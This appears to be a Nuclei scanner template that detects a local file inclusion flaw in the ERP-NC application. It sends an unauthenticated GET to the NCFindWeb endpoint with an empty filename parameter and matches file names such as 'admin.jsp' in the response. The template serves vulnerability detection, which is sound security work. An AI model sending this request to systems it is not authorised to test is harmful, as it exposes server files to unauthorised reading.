id: erp-nc-directory-traversal

info:
  name: ERP-NC - Local File Inclusion
  author: pikpikcu
  severity: high
  description: ERP-NC is vulnerable to local file inclusion.
  reference:
    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22,CWE-73
  metadata:
    max-request: 1
  tags: lfi,erp-nc,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Client"
          - "ncwslogin.jsp"
          - "admin.jsp"
        part: body
        condition: and

      - type: status
        status:
          - 200
